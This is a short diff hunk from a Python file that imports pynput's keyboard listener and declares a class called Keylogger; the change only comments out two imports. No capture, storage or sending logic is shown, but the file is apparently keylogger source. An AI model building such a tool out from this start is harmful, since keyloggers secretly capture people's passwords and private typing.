@@ -1,7 +1,7 @@
 import os
 from pynput.keyboard import Listener
-import time
-import threading
+# import time
+# import threading
 
 
 class Keylogger():
